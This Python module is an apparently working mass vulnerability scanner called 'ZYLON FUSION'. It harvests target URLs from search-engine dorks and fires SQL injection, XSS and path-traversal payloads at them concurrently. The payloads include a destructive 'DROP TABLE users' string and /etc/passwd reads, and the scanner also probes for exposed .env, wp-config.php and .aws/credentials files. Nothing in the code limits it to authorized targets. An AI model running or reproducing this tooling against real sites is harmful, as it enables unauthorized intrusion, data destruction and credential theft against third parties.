#!/usr/bin/env python3
"""
ZYLON FUSION v5.0.0 - Mass Vulnerability Scanner Engine
Based on: SQLIV + Exploit-Sniper + BugBountyScanner
Capabilities:
  - Multi-vulnerability concurrent scanning
  - Google dork-based mass SQLi detection
  - Dork-based sensitive file discovery
  - Mass domain scanning
  - Concurrent XSS + SQLi + LFI scanning
  - Multi-target scanning from file
  - URL harvesting from search engines
  - Automated vulnerability classification
  - Result deduplication
  - Batch reporting
Termux Compatible | No Root Required | Python 3.13+
"""

import requests
import re
import os
import time
import random
import string
import urllib.parse
import hashlib
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

from core.shared_infra import shared_session, PayloadInjector, regex_cache
from core.var import DEFAULT_TIMEOUT

# ============================================================================
# ANSI COLORS (Termux compatible)
# ============================================================================

RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ============================================================================
# DORK DATABASE
# ============================================================================

GOOGLE_DORKS_SQLO = [
    'inurl:"{target}" filetype:sql',
    'inurl:"{target}" "MySQL" inurl:sql',
    'inurl:"{target}" "sql syntax" "error"',
    'site:{target} inurl:sql',
    'site:{target} intext:"sql syntax" "mysql"',
    'site:{target} intitle:"index of" "database.sql"',
    'site:{target} inurl:"php?id="',
    'site:{target} inurl:"news.php?id="',
    'site:{target} inurl:"article.php?id="',
    'site:{target} inurl:"product.php?id="',
    'site:{target} inurl:"item.php?id="',
    'site:{target} inurl:"page.php?id="',
    'site:{target} inurl:"detail.php?id="',
    'site:{target} inurl:"view.php?id="',
    'site:{target} inurl:"category.php?id="',
]

GOOGLE_DORKS_SENSITIVE = [
    'site:{target} filetype:env',
    'site:{target} filetype:log',
    'site:{target} filetype:conf',
    'site:{target} filetype:bak',
    'site:{target} filetype:old',
    'site:{target} filetype:ini',
    'site:{target} filetype:yml',
    'site:{target} filetype:json "password"',
    'site:{target} intitle:"index of" ".env"',
    'site:{target} intitle:"index of" "config"',
    'site:{target} intitle:"index of" "backup"',
    'site:{target} inurl:"/wp-config.php"',
    'site:{target} inurl:"/.env"',
    'site:{target} inurl:"/config.php"',
    'site:{target} inurl:"/debug" "trace"',
]

GOOGLE_DORKS_XSS = [
    'site:{target} inurl:"search?q="',
    'site:{target} inurl:"query="',
    'site:{target} inurl:"keyword="',
    'site:{target} inurl:"name="',
    'site:{target} inurl:"q="',
    'site:{target} inurl:"input="',
]

# ============================================================================
# SQLI PAYLOAD DATABASE (SQLIV-style)
# ============================================================================

SQLI_PAYLOADS = [
    "'", '"', "1'", '1"', "' OR '1'='1", '" OR "1"="1',
    "' OR '1'='1' --", '" OR "1"="1" --', "' OR '1'='1' #",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "admin'--",
    "' OR 1=1--", "' OR 'x'='x", "' AND 1=1--",
    "1' ORDER BY 1--", "1' ORDER BY 2--",
    "1; DROP TABLE users--", "' OR SLEEP(5)--",
    "1' AND SLEEP(5)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1' AND 1=1--", "1' AND 1=2--",
    "' AND SUBSTRING(@@version,1,1)='5'--",
    "' AND SUBSTRING(@@version,1,1)='8'--",
]

SQLI_ERROR_PATTERNS = [
    "SQL syntax", "MySQL", "ORA-", "PostgreSQL", "Microsoft SQL",
    "ODBC Driver", "SQLite", "JDBC", "Oracle error", "Syntax error",
    "unclosed quotation", "SQL command not properly ended",
    "mysql_fetch", "mysql_num_rows", "pg_query", "sqlite_query",
    "Warning: mysql", "valid MySQL result", "check the manual",
    "MySQLSyntaxErrorException", "postgresql.util.PSQLException",
    "You have an error in your SQL syntax",
    "Warning: pg_", "Unclosed quotation mark",
    "SQLSTATE[", "sql_error", "SQL Error",
]

# ============================================================================
# XSS PAYLOAD DATABASE (mass scanning)
# ============================================================================

MASS_XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "<svg onload=alert(1)>",
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    "javascript:alert(1)",
    '<details open ontoggle=alert(1)>',
    '<svg/onload=alert(1)>',
]

# ============================================================================
# LFI PAYLOAD DATABASE (mass scanning)
# ============================================================================

MASS_LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../etc/passwd",
    "/etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "../../../../../../etc/passwd%00",
]

LFI_SIGNATURES = [
    r"root:x:0:0:", r"nobody:x:", r":/bin/(?:ba)?sh$",
    r":/home/", r":/usr/sbin/nologin",
]

# ============================================================================
# SENSITIVE FILE PATHS
# ============================================================================

SENSITIVE_PATHS = [
    ".env", ".git/HEAD", ".git/config", ".svn/entries",
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    "wp-config.php", "wp-config.php.bak", "wp-config.php~",
    "config.php", "config.yml", "config.yaml", "config.json",
    "phpinfo.php", "info.php", "test.php",
    "backup.zip", "backup.tar.gz", "backup.sql",
    "server-status", "server-info",
    ".htaccess", ".htpasswd", ".DS_Store",
    "swagger.json", "openapi.json", "api-docs",
    "README.md", "CHANGELOG.md", "package.json",
    "Dockerfile", "docker-compose.yml",
    ".aws/credentials", "credentials.json",
    "error.log", "access.log", "debug.log",
]


class MassVulnEngine:
    """Mass Vulnerability Scanner Engine - Multi-vuln concurrent scanning"""

    def __init__(self, target=None, headers=None, cookies=None, proxy=None,
                 timeout=10, threads=15):
        self.target = target
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.session = shared_session
        self._lock = Lock()
        self._seen_hashes = set()

    def _dedup(self, finding):
        """Deduplicate findings using content hash"""
        content = json.dumps(finding, sort_keys=True, default=str)
        h = hashlib.md5(content.encode()).hexdigest()
        if h in self._seen_hashes:
            return False
        self._seen_hashes.add(h)
        return True

    def _send_request(self, url, method="GET", data=None, headers=None):
        """Send HTTP request with error handling"""
        try:
            h = headers or self.headers
            if method == "GET":
                resp = self.session.get(url, params=data, headers=h,
                                       cookies=self.cookies, timeout=self.timeout,
                                       allow_redirects=True)
            else:
                resp = self.session.post(url, data=data, headers=h,
                                        cookies=self.cookies, timeout=self.timeout,
                                        allow_redirects=True)
            return resp
        except Exception:
            return None

    def _extract_domain(self, url):
        """Extract domain from URL"""
        parsed = urllib.parse.urlparse(url if '://' in url else f'https://{url}')
        return parsed.netloc

    # ========================================================================
    # SCAN: Google Dork Scanning
    # ========================================================================

    def dork_scan(self, dork, pages=5):
        """Google dork scanning - URL harvesting from search engines"""
        print(f"{CYAN}{BOLD}[MassVuln] Dork Scan: {dork}{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'dork': dork,
                'pages': pages,
                'timestamp': datetime.now().isoformat(),
                'urls_harvested': [],
                'total_urls': 0,
            },
            'scan_type': 'mass_dork_scan',
        }

        # Use DuckDuckGo as search engine (no API key needed)
        harvested_urls = []
        for page in range(pages):
            try:
                search_url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(dork)}&s={page * 30}"
                resp = self._send_request(search_url)
                if not resp:
                    continue
                # Extract URLs from search results
                url_pattern = regex_cache.findall(r'uddg=([^&"]+)', resp.text)
                for encoded_url in url_pattern:
                    try:
                        decoded = urllib.parse.unquote(encoded_url)
                        if decoded.startswith('http') and decoded not in harvested_urls:
                            harvested_urls.append(decoded)
                    except Exception:
                        pass
                time.sleep(0.5)  # Rate limiting
            except Exception:
                continue

        results['details']['urls_harvested'] = harvested_urls
        results['details']['total_urls'] = len(harvested_urls)

        # Test harvested URLs for vulnerabilities
        for url in harvested_urls[:30]:  # Limit to 30 URLs
            vuln_result = self._quick_vuln_check(url)
            if vuln_result:
                results['findings'].append(vuln_result)
                results['vulnerable'] = True

        print(f"{GREEN}[MassVuln] Harvested: {len(harvested_urls)} URLs | Findings: {len(results['findings'])}{RESET}")
        return results

    def _quick_vuln_check(self, url):
        """Quick vulnerability check on a URL"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        finding = None

        # Check for SQL indicators in URL
        sqli_params = ['id', 'cat', 'page', 'item', 'product', 'news', 'article']
        for param in params:
            if param.lower() in sqli_params:
                finding = {
                    'type': 'potential_sqli',
                    'url': url,
                    'parameter': param,
                    'severity': 'high',
                }
                break

        # Check for XSS indicators
        xss_params = ['q', 'search', 'query', 'keyword', 'name']
        for param in params:
            if param.lower() in xss_params:
                finding = {
                    'type': 'potential_xss',
                    'url': url,
                    'parameter': param,
                    'severity': 'medium',
                }
                break

        return finding

    # ========================================================================
    # SCAN: Mass SQLi Detection
    # ========================================================================

    def mass_sqli(self, targets):
        """Mass SQLi detection across multiple targets"""
        if isinstance(targets, str):
            targets = [targets]

        print(f"{CYAN}{BOLD}[MassVuln] Mass SQLi Detection: {len(targets)} targets{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'targets_tested': len(targets),
                'timestamp': datetime.now().isoformat(),
                'vulnerable_count': 0,
                'injection_types': [],
            },
            'scan_type': 'mass_sqli',
        }

        def test_sqli(target):
            target_findings = []
            parsed = urllib.parse.urlparse(target if '://' in target else f'https://{target}')
            params = urllib.parse.parse_qs(parsed.query)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            if not params:
                # Test common SQLi parameters
                params = {'id': ['1'], 'page': ['1'], 'item': ['1']}

            for param_name in params:
                for payload in SQLI_PAYLOADS[:10]:  # Top 10 payloads for speed
                    test_url = f"{base_url}?{param_name}={urllib.parse.quote(payload)}"
                    resp = self._send_request(test_url)
                    if not resp:
                        continue

                    # Check for SQL error patterns
                    for pattern in SQLI_ERROR_PATTERNS:
                        if pattern.lower() in resp.text.lower():
                            finding = {
                                'type': 'sqli',
                                'url': target,
                                'parameter': param_name,
                                'payload': payload,
                                'error_pattern': pattern,
                                'severity': 'critical',
                            }
                            if self._dedup(finding):
                                target_findings.append(finding)
                            break

            return target_findings

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_sqli, t): t for t in targets}
            for future in as_completed(futures):
                try:
                    findings = future.result()
                    if findings:
                        results['vulnerable'] = True
                        results['details']['vulnerable_count'] += len(findings)
                        results['findings'].extend(findings)
                except Exception:
                    pass

        print(f"{GREEN}[MassVuln] SQLi: {results['details']['vulnerable_count']} vulnerabilities found{RESET}")
        return results

    # ========================================================================
    # SCAN: Mass XSS Detection
    # ========================================================================

    def mass_xss(self, targets):
        """Mass XSS detection across multiple targets"""
        if isinstance(targets, str):
            targets = [targets]

        print(f"{CYAN}{BOLD}[MassVuln] Mass XSS Detection: {len(targets)} targets{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'targets_tested': len(targets),
                'timestamp': datetime.now().isoformat(),
                'vulnerable_count': 0,
                'reflection_count': 0,
            },
            'scan_type': 'mass_xss',
        }

        def test_xss(target):
            target_findings = []
            parsed = urllib.parse.urlparse(target if '://' in target else f'https://{target}')
            params = urllib.parse.parse_qs(parsed.query)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            if not params:
                params = {'q': ['test'], 'search': ['test'], 'name': ['test']}

            # Generate unique marker
            marker = ''.join(random.choices(string.ascii_lowercase, k=8))

            for param_name in params:
                # Test for reflection first
                test_payload = f"{marker}xsstest"
                test_url = f"{base_url}?{param_name}={urllib.parse.quote(test_payload)}"
                resp = self._send_request(test_url)
                if not resp or marker not in resp.text:
                    continue

                results['details']['reflection_count'] = results.get('details', {}).get('reflection_count', 0) + 1

                # Test XSS payloads
                for payload in MASS_XSS_PAYLOADS[:8]:
                    xss_url = f"{base_url}?{param_name}={urllib.parse.quote(payload, safe='')}"
                    resp = self._send_request(xss_url)
                    if not resp:
                        continue

                    # Check for reflected payload
                    if payload in resp.text or payload.replace("'", "&#39;") in resp.text:
                        finding = {
                            'type': 'xss',
                            'url': target,
                            'parameter': param_name,
                            'payload': payload,
                            'severity': 'high',
                        }
                        if self._dedup(finding):
                            target_findings.append(finding)

            return target_findings

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(test_xss, t): t for t in targets}
            for future in as_completed(futures):
                try:
                    findings = future.result()
                    if findings:
                        results['vulnerable'] = True
                        results['details']['vulnerable_count'] += len(findings)
                        results['findings'].extend(findings)
                except Exception:
                    pass

        print(f"{GREEN}[MassVuln] XSS: {results['details']['vulnerable_count']} vulnerabilities found{RESET}")
        return results

    # ========================================================================
    # SCAN: Multi-Vulnerability Concurrent Scan
    # ========================================================================

    def multi_vuln_scan(self, target):
        """Multi-vulnerability concurrent scan (XSS + SQLi + LFI + Sensitive)"""
        if not target.startswith('http'):
            target = f"https://{target}"

        print(f"{RED}{BOLD}[MassVuln] Multi-Vuln Scan: {target}{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'url': target,
                'timestamp': datetime.now().isoformat(),
                'sqli_findings': 0,
                'xss_findings': 0,
                'lfi_findings': 0,
                'sensitive_findings': 0,
                'total_tests': 0,
            },
            'scan_type': 'multi_vuln_scan',
        }

        parsed = urllib.parse.urlparse(target)
        params = urllib.parse.parse_qs(parsed.query)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Phase 1: SQLi Testing
        print(f"{YELLOW}  [Phase 1/4] SQLi Testing...{RESET}")
        sqli_findings = self._test_sqli_concurrent(base_url, params)
        results['details']['sqli_findings'] = len(sqli_findings)
        results['findings'].extend(sqli_findings)

        # Phase 2: XSS Testing
        print(f"{YELLOW}  [Phase 2/4] XSS Testing...{RESET}")
        xss_findings = self._test_xss_concurrent(base_url, params)
        results['details']['xss_findings'] = len(xss_findings)
        results['findings'].extend(xss_findings)

        # Phase 3: LFI Testing
        print(f"{YELLOW}  [Phase 3/4] LFI Testing...{RESET}")
        lfi_findings = self._test_lfi_concurrent(base_url, params)
        results['details']['lfi_findings'] = len(lfi_findings)
        results['findings'].extend(lfi_findings)

        # Phase 4: Sensitive File Discovery
        print(f"{YELLOW}  [Phase 4/4] Sensitive File Discovery...{RESET}")
        sensitive_findings = self._test_sensitive_files(base_url)
        results['details']['sensitive_findings'] = len(sensitive_findings)
        results['findings'].extend(sensitive_findings)

        results['details']['total_tests'] = (
            results['details']['sqli_findings'] +
            results['details']['xss_findings'] +
            results['details']['lfi_findings'] +
            results['details']['sensitive_findings']
        )

        if results['findings']:
            results['vulnerable'] = True

        print(f"{GREEN}[MassVuln] Multi-Vuln: {results['details']['total_tests']} total findings "
              f"(SQLi:{results['details']['sqli_findings']} XSS:{results['details']['xss_findings']} "
              f"LFI:{results['details']['lfi_findings']} Sensitive:{results['details']['sensitive_findings']}){RESET}")
        return results

    def _test_sqli_concurrent(self, base_url, params):
        """Concurrent SQLi testing"""
        findings = []
        test_params = list(params.keys()) if params else ['id', 'page', 'item', 'cat']

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for param in test_params[:5]:
                for payload in SQLI_PAYLOADS[:8]:
                    test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    # Also test as JSON body
                    try:
                        self.session.post(base_url, json={param: payload}, timeout=DEFAULT_TIMEOUT, verify=False)
                    except Exception:
                        pass
                    futures.append(executor.submit(self._check_sqli, test_url, param, payload))

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and self._dedup(result):
                        findings.append(result)
                except Exception:
                    pass

        return findings

    def _check_sqli(self, url, param, payload):
        """Check single URL for SQLi"""
        resp = self._send_request(url)
        if not resp:
            return None
        for pattern in SQLI_ERROR_PATTERNS:
            if pattern.lower() in resp.text.lower():
                return {
                    'type': 'sqli',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'error_pattern': pattern,
                    'severity': 'critical',
                }
        return None

    def _test_xss_concurrent(self, base_url, params):
        """Concurrent XSS testing"""
        findings = []
        test_params = list(params.keys()) if params else ['q', 'search', 'name', 'query']
        marker = ''.join(random.choices(string.ascii_lowercase, k=8))

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for param in test_params[:5]:
                # Check reflection first
                test_url = f"{base_url}?{param}={marker}xsstest"
                resp = self._send_request(test_url)
                if resp and marker in resp.text:
                    for payload in MASS_XSS_PAYLOADS[:6]:
                        xss_url = f"{base_url}?{param}={urllib.parse.quote(payload, safe='')}"
                        # Also test as JSON body
                        try:
                            self.session.post(base_url, json={param: payload}, timeout=DEFAULT_TIMEOUT, verify=False)
                        except Exception:
                            pass
                        futures.append(executor.submit(self._check_xss, xss_url, param, payload))

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and self._dedup(result):
                        findings.append(result)
                except Exception:
                    pass

        return findings

    def _check_xss(self, url, param, payload):
        """Check single URL for XSS"""
        resp = self._send_request(url)
        if not resp:
            return None
        if payload in resp.text:
            return {
                'type': 'xss',
                'url': url,
                'parameter': param,
                'payload': payload,
                'severity': 'high',
            }
        return None

    def _test_lfi_concurrent(self, base_url, params):
        """Concurrent LFI testing"""
        findings = []
        test_params = list(params.keys()) if params else ['file', 'page', 'path', 'include']

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for param in test_params[:5]:
                for payload in MASS_LFI_PAYLOADS[:5]:
                    test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                    # Also test as JSON body
                    try:
                        self.session.post(base_url, json={param: payload}, timeout=DEFAULT_TIMEOUT, verify=False)
                    except Exception:
                        pass
                    futures.append(executor.submit(self._check_lfi, test_url, param, payload))

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and self._dedup(result):
                        findings.append(result)
                except Exception:
                    pass

        return findings

    def _check_lfi(self, url, param, payload):
        """Check single URL for LFI"""
        resp = self._send_request(url)
        if not resp:
            return None
        for pattern in LFI_SIGNATURES:
            if regex_cache.search(pattern, resp.text):
                return {
                    'type': 'lfi',
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'severity': 'critical',
                }
        return None

    def _test_sensitive_files(self, base_url):
        """Test for sensitive file exposure"""
        findings = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for path in SENSITIVE_PATHS[:25]:
                url = f"{base_url}/{path}" if not base_url.endswith('/') else f"{base_url}{path}"
                futures[executor.submit(self._check_sensitive, url, path)] = url

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result and self._dedup(result):
                        findings.append(result)
                except Exception:
                    pass

        return findings

    def _check_sensitive(self, url, path):
        """Check single URL for sensitive file exposure"""
        resp = self._send_request(url)
        if not resp or resp.status_code != 200:
            return None
        # Skip if response is too small or looks like default 404
        if len(resp.text) < 20:
            return None
        # Check for actual content vs. soft 404
        if resp.status_code == 200 and len(resp.text) > 50:
            return {
                'type': 'sensitive_file',
                'url': url,
                'path': path,
                'content_length': len(resp.text),
                'severity': 'medium',
            }
        return None

    # ========================================================================
    # SCAN: Scan Targets from File
    # ========================================================================

    def scan_from_file(self, file_path):
        """Scan targets from file"""
        if not os.path.isfile(file_path):
            print(f"{RED}[MassVuln] File not found: {file_path}{RESET}")
            return {'vulnerable': False, 'findings': [], 'details': {'error': 'file_not_found'}, 'scan_type': 'mass_file_scan'}

        with open(file_path, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]

        print(f"{CYAN}{BOLD}[MassVuln] File Scan: {len(targets)} targets{RESET}")
        results = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'targets': len(targets),
                'timestamp': datetime.now().isoformat(),
                'vulnerable_targets': 0,
            },
            'scan_type': 'mass_file_scan',
        }

        with ThreadPoolExecutor(max_workers=min(self.threads, len(targets))) as executor:
            futures = {executor.submit(self.multi_vuln_scan, t): t for t in targets}
            for future in as_completed(futures):
                target = futures[future]
                try:
                    scan_result = future.result()
                    if scan_result.get('vulnerable'):
                        results['vulnerable'] = True
                        results['details']['vulnerable_targets'] += 1
                        results['findings'].extend(scan_result.get('findings', []))
                except Exception:
                    pass

        print(f"{GREEN}[MassVuln] File scan: {results['details']['vulnerable_targets']}/{len(targets)} vulnerable{RESET}")
        return results

    # ========================================================================
    # SCAN: Vulnerability Classification
    # ========================================================================

    def classify_vulns(self, results_list):
        """Classify and prioritize vulnerabilities"""
        print(f"{CYAN}{BOLD}[MassVuln] Vulnerability Classification{RESET}")
        classification = {
            'vulnerable': False,
            'findings': [],
            'details': {
                'timestamp': datetime.now().isoformat(),
                'by_severity': {'critical': [], 'high': [], 'medium': [], 'low': [], 'info': []},
                'by_type': {},
                'total_classified': 0,
                'unique_targets': set(),
            },
            'scan_type': 'mass_vuln_classification',
        }

        for result in results_list:
            if not isinstance(result, dict):
                continue
            findings = result.get('findings', [])
            for finding in findings:
                vuln_type = finding.get('type', 'unknown')
                severity = finding.get('severity', 'info')

                # Classify by severity
                if severity in classification['details']['by_severity']:
                    classification['details']['by_severity'][severity].append(finding)
                else:
                    classification['details']['by_severity']['info'].append(finding)

                # Classify by type
                if vuln_type not in classification['details']['by_type']:
                    classification['details']['by_type'][vuln_type] = []
                classification['details']['by_type'][vuln_type].append(finding)

                # Track unique targets
                url = finding.get('url', '')
                if url:
                    classification['details']['unique_targets'].add(url)

                classification['findings'].append(finding)
                classification['details']['total_classified'] += 1

        # Convert set to list for JSON serialization
        classification['details']['unique_targets'] = list(classification['details']['unique_targets'])

        if classification['details']['by_severity'].get('critical') or \
           classification['details']['by_severity'].get('high'):
            classification['vulnerable'] = True

        crit_count = len(classification['details']['by_severity'].get('critical', []))
        high_count = len(classification['details']['by_severity'].get('high', []))
        print(f"{GREEN}[MassVuln] Classification: {classification['details']['total_classified']} vulns | "
              f"Critical:{crit_count} High:{high_count}{RESET}")
        return classification

    # ========================================================================
    # MAIN ENTRY POINT
    # ========================================================================

    def run(self, target=None, scan_type='multi', **kwargs):
        """Main entry point for MassVuln Engine"""
        t = target or self.target
        if scan_type == 'dork':
            dork = kwargs.get('dork', f'site:{t}')
            return self.dork_scan(dork, pages=kwargs.get('pages', 5))
        elif scan_type == 'sqli':
            targets = kwargs.get('targets', [t] if t else [])
            return self.mass_sqli(targets)
        elif scan_type == 'xss':
            targets = kwargs.get('targets', [t] if t else [])
            return self.mass_xss(targets)
        elif scan_type == 'multi':
            if not t:
                return {'vulnerable': False, 'findings': [], 'details': {'error': 'no_target'}, 'scan_type': 'multi_vuln_scan'}
            return self.multi_vuln_scan(t)
        elif scan_type == 'file':
            return self.scan_from_file(kwargs.get('file_path', ''))
        elif scan_type == 'classify':
            return self.classify_vulns(kwargs.get('results', []))
        else:
            if not t:
                return {'vulnerable': False, 'findings': [], 'details': {'error': 'no_target'}, 'scan_type': 'mass_vuln'}
            return self.multi_vuln_scan(t)


# ============================================================================
# MODULE-LEVEL RUN FUNCTION
# ============================================================================

def run(target=None, scan_type='multi', **kwargs):
    """Module-level entry point for MassVuln Engine"""
    engine = MassVulnEngine(
        target=target,
        headers=kwargs.get('headers'),
        cookies=kwargs.get('cookies'),
        proxy=kwargs.get('proxy'),
        timeout=kwargs.get('timeout', 10),
        threads=kwargs.get('threads', 15),
    )
    return engine.run(target=target, scan_type=scan_type, **kwargs)
